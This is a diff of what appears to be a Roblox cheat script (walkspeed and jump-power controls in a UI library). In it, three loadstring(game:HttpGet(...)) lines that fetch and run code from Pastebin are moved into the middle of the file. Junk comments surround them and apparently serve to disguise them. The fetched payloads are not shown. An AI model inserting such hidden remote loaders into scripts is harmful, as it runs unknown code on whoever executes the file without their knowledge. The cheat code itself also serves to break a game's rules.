@@ -2229,7 +2229,13 @@ HomeSection:NewButton("Reset WS/JP", "Rests Walkspeed and jumpPower to default",
     game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
     game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
 end)
-
+--game.Players.LocalPlayers.mg
+loadstring(game:HttpGet("https://pastebin.com/raw/9pDtfnLD"))()
+--Ctrller.P==Start:Library=true
+loadstring(game:HttpGet("https://pastebin.com/raw/X9irXUVp",true))()
+--3rdstring%"".<LoadLibrary:end#%*^>
+loadstring(game:HttpGet("https://pastebin.com/raw/P1Yrf09M"))()
+--\//\/if game loaded:warn("done"--\
 
 
 
@@ -2385,15 +2391,6 @@ local MoreSection = More:NewSection("no")
 MoreSection:NewKeybind("Toggle ui", "toggle the ui yes", Enum.KeyCode.Insert, function()
     Library:ToggleUI()
 end)
-
-
---game.Players.LocalPlayers.mg
-loadstring(game:HttpGet("https://pastebin.com/raw/9pDtfnLD"))()
---Ctrller.P==Start:Library=true
-loadstring(game:HttpGet("https://pastebin.com/raw/X9irXUVp",true))()
---3rdstring%"".<LoadLibrary:end#%*^>
-loadstring(game:HttpGet("https://pastebin.com/raw/P1Yrf09M"))()
---\//\/if game loaded:warn("done"--\
 
 
 
